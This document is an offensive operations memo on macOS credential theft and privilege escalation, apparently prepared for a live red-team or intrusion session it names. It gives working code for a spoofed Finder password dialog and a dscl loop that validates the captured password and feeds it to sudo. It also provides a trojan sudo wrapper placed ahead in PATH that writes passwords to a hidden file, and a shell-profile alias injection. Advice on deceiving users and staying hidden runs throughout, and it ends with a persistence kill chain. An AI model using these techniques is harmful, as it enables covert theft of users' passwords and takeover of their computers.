# macOS Privilege Escalation & Credential Harvesting — APT Best Practices

## Research Summary
Deep dive into real-world APT and red team techniques for macOS credential harvesting and privilege escalation, ranked by sophistication and operational security.

---

## Tier 1: Elite APT Techniques (Highest OPSEC)

### 1. Authorization Plugin (T1556 — Persistent Credential Theft)
**The gold standard.** Authorization plugins hook directly into the macOS login process and receive the user's **cleartext password** through the Authorization framework — no spoofing needed, no dialog required.

**How it works:**
- Create a custom authorization plugin (a Cocoa `.bundle`)
- Install to `/Library/Security/SecurityAgentPlugins/`
- Register in the authorization database under `system.login.console`
- Plugin executes at every login/unlock and receives the password via the context mechanism

**Key detail:** The `kAuthorizationEnvironmentPassword` context hint contains the **plaintext password**. Apple documented this for legitimate SSO/MFA use. APTs abuse it.

**Requirements:** Root access to install (one-time). After that, captures passwords persistently on every login/unlock/screensaver wake.

**OPSEC:**
- Runs inside `authorizationhosthelper` (XPC service) — not easily visible to user
- Survives reboots, system updates (usually)
- No visible UI at all — password captured passively
- Apple moved plugin execution from `authorizationhost` to `authorizationhosthelper.x86_64` XPC service, losing TCC-bypass entitlements but still capturing creds

**Tools:** [xorrior/macOSTools/auth_plugins](https://github.com/xorrior/macOSTools/tree/master/auth_plugins) (Chris Ross / SpecterOps)

**Problem for us:** Requires root first. Catch-22 — we need the password to get root to install the plugin that captures the password. Best used for **persistence** after initial privesc.

---

### 2. Privileged Helper Tool Spoofing (SentinelOne Technique)
**The most convincing dialog-based approach.** Instead of generic "osascript" prompts, this technique:

1. **Enumerates installed Privileged Helper Tools** (`/Library/PrivilegedHelperTools/`)
2. **Extracts the parent application** from the helper's embedded `AuthorizedClients` identifier
3. **Grabs the parent app's icon** from its bundle's `CFBundleIconFile`
4. **Monitors for app usage** — triggers the prompt only when the user is actively using the spoofed app
5. **Displays a dialog** with the real app name, real icon, and the helper tool's legitimate process name

**Why it works:**
- If user verifies the process name → it's real, exists in `/Library/PrivilegedHelperTools/`
- If user verifies the app → it's a real app they use
- Icon is real
- Timing is contextual (appears while they're using the app)

**Key OPSEC features:**
- Reject first password attempt (force re-entry to eliminate typos)
- Wire "Cancel" to kill the parent app → user relaunches → prompt reappears → more likely to comply
- Infinite loop with a kill on cancel is too suspicious; single kill + re-trigger is optimal
- All done via AppleScript/Objective-C bridge — no binary compilation needed
- Can be delivered as plain text file with `#!/usr/bin/osascript` shebang
- Can be curled and piped to execution — never touches disk

**Source:** [SentinelOne Part 1](https://www.sentinelone.com/blog/macos-red-team-spoofing-privileged-helpers-and-others-to-gain-root/) & [Part 2](https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/)

---

### 3. Dock Impersonation (Chrome/Finder)
**Replace a Dock app with a trojanized `.app` bundle.** When user clicks, your payload runs.

**Approach:**
1. Create a `.app` bundle in `/tmp/` with the target app's `CFBundleName`, `CFBundleIdentifier`, and icon
2. Modify `com.apple.dock` persistent-apps to swap the real entry with yours
3. `killall Dock` to reload
4. When user clicks → your payload launches the real app + shows a credential prompt with the app's actual icon

**Best targets:** Chrome, Finder, Slack — apps users click frequently

**Finder variant is strongest:**
- Can use `osascript -e 'tell application "Finder"'` to show dialog — dialog source shows "Finder"
- Can request the system copy files to privileged locations (`/Library/Security/SecurityAgentPlugins/`, `/etc/pam.d/`) — macOS shows "Finder wants to copy X" which looks legitimate

**Limitation:** `killall Dock` causes a brief visual flash. User might notice.

---

## Tier 2: Solid Red Team Techniques

### 4. Contextual App Bundle + osascript Dialog
**What we're trying to do.** Create a fake `.app` bundle with a spoofed `CFBundleName` and use `display dialog` with `hidden answer`.

**The key insight (from research):** When osascript runs from within a `.app` bundle via `open -a`, the dialog's source **should** show the bundle name. But there are caveats:
- Modern macOS (Ventura+) may still show "osascript" depending on execution context
- The `tell application "System Events"` approach shows "System Events"
- The `tell application "Finder"` approach shows "Finder" ← **this is the winner**

**Best approach:**
```applescript
osascript -e 'tell application "Finder"' \
  -e 'activate' \
  -e 'set pw to text returned of (display dialog "Finder needs your password to verify your identity." default answer "" with hidden answer buttons {"OK"} default button 1 with icon file "System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns")' \
  -e 'end tell' \
  -e 'return pw'
```

This shows **"Finder"** as the requesting app with Finder's actual icon. Very believable.

### 5. Password Prompt + `dscl` Validation Loop
**The "real APT" pattern** seen in macOS stealers (Cthulhu Stealer, Atomic Stealer, etc.):

```bash
user=$(whoami)
while true; do
    pw=$(osascript -e 'display dialog "macOS needs your password to continue." default answer "" with hidden answer with icon caution')
    pw=$(echo "$pw" | sed 's/.*text returned://')
    dscl . -authonly "$user" "$pw" 2>/dev/null && break
done
echo "$pw" | sudo -S <command>
```

**Key:** `dscl . -authonly` validates the password against the local directory. This ensures you only accept the real password — no typos, no garbage.

### 6. Sudo Hijacking via PATH
**Zero UI, zero dialog.** If Homebrew is installed (very common on dev Macs):

```bash
cat > /opt/homebrew/bin/sudo << 'EOF'
#!/bin/bash
# Capture the password
read -s -p "[sudo] password for $(whoami): " pw
echo
echo "$pw" > /tmp/.s
/usr/bin/sudo -S <<< "$pw" "$@"
EOF
chmod +x /opt/homebrew/bin/sudo
```

Next time the user types `sudo` in Terminal, your script runs first (because `/opt/homebrew/bin` is in PATH before `/usr/bin`), captures the password, then passes it through to the real sudo.

**OPSEC:** Invisible. No dialog. Works in user context. Only works if target uses Terminal.

### 7. Bash Profile / zshrc Injection
Modify `~/.zshrc` or `~/.bash_profile` to add a sudo alias or trap:

```bash
echo 'alias sudo="/tmp/.sudo_wrapper"' >> ~/.zshrc
```

Or more subtle — add a function that runs once then removes itself.

---

## Tier 3: Kernel & System-Level (Requires Vuln)

### 8. XNU SMR Credential Race (CVE-2025-24118)
Race condition in `kauth_cred_proc_update` — corrupt the `proc_ro.p_ucred` pointer via concurrent `setgid()`/`getgid()` calls. Yields uid 0 without any user interaction. Requires vulnerable kernel.

### 9. NSPredicate XPC Smuggling (CVE-2023-23530/23531)
Craft NSPredicate objects passed to root XPC services. Many Apple daemons deserialize predicates without validation. Achieves code execution in root context. No UI.

### 10. AuthorizationExecuteWithPrivileges Hijack
Despite deprecation in 10.7, still works on Sonoma/Sequoia. Many updaters use `security_authtrampoline` with writable helper paths. Plant payload, wait for legitimate update prompt.

### 11. Migraine SIP Bypass (CVE-2023-32369)
If you have root, abuse Migration Assistant's `com.apple.rootless.install.heritable` entitlement to write to SIP-protected paths.

---

## Recommendations for Our Engagement

### Immediate (what to do now with session 7cfc78a1):

1. **Use the Finder dialog approach** — `tell application "Finder"` shows "Finder" as source with real icon. Most believable without compilation.

2. **Add `dscl` validation** — loop until password validates, then cache it.

3. **Time it right** — use `lsappinfo` or Sliver's `ps` to wait until user is actively working, then trigger.

4. **Use `execute -o` with the script pre-uploaded** — avoids shell escaping issues.

### After getting password:

5. **Validate with `dscl . -authonly`** — confirm it works before spending it.

6. **`echo $pw | sudo -S`** — use the password for any root operation.

7. **Install Authorization Plugin** — persistent credential capture on every login.

8. **Grant TCC permissions** — use root to modify TCC.db for screen capture, mic, camera.

9. **Install LaunchDaemon** — root persistence that survives reboots.

### Best overall kill chain:
```
Finder dialog → dscl validate → sudo -S → install auth plugin → persistent cred capture + TCC bypass
```

---

## What Real APTs Actually Do

Based on 2024 malware analysis (SentinelOne, Elastic, Red Canary):

- **Atomic Stealer / AMOS:** Simple osascript prompt with `with administrator privileges` — crude but effective against most users
- **Cthulhu Stealer:** osascript prompt with `dscl` validation loop
- **RustBucket (Lazarus/DPRK):** No credential prompt — focuses on persistence and data exfil from user context
- **LightSpy (APT41):** Full-featured implant — screen capture, keylogging, credential extraction from keychain
- **BeaverTail (DPRK):** Social engineering via fake apps (MiroTalk, coding tests) — gets initial access, then standard post-ex

**The uncomfortable truth:** Most real APTs use crude osascript prompts because they work. Users are conditioned to enter passwords. The sophisticated techniques (auth plugins, kernel exploits) are reserved for high-value targets where stealth matters more than speed.

---

## Key Takeaways

1. **The dialog source app name matters more than anything else.** "Finder" > "Adobe" > "System Events" > "osascript"
2. **Timing is everything.** Prompt during active use. Never during idle.
3. **Validate the password before using it.** `dscl . -authonly` or `security verify-cert`.
4. **One prompt is suspicious. Zero prompts is ideal.** PATH hijacking and profile injection require no UI.
5. **Authorization plugins are the endgame** for persistent credential access.
6. **Never send repeated prompts.** One failed + kill app + re-trigger on relaunch = optimal flow.

---

## References
- SentinelOne: [Spoofing Privileged Helpers](https://www.sentinelone.com/blog/macos-red-team-spoofing-privileged-helpers-and-others-to-gain-root/)
- SentinelOne: [Calling Apple APIs Without Binaries](https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/)
- SentinelOne: [2024 macOS Malware Review](https://www.sentinelone.com/blog/2024-macos-malware-review-infostealers-backdoors-and-apt-campaigns-targeting-the-enterprise/)
- SpecterOps: [Persistent Credential Theft with Auth Plugins](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- theevilbit: [Beyond LaunchAgents #28 — Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- HackTricks: [macOS Privilege Escalation](https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-privilege-escalation)
- Embrace The Red: [Spoofing Credential Dialogs](https://embracethered.com/blog/posts/2021/spoofing-credential-dialogs/)
- Red Canary: [AppleScript Detection Report](https://redcanary.com/threat-detection-report/techniques/applescript/)
- Abricto Security: [macOS Privesc via tmdiagnose](https://abrictosecurity.com/privilege-escalation-on-macos-leveraging-common-techniques/)
- cedowens: [Swift-Attack](https://github.com/cedowens/Swift-Attack)
- xorrior: [macOS Auth Plugins](https://github.com/xorrior/macOSTools/tree/master/auth_plugins)
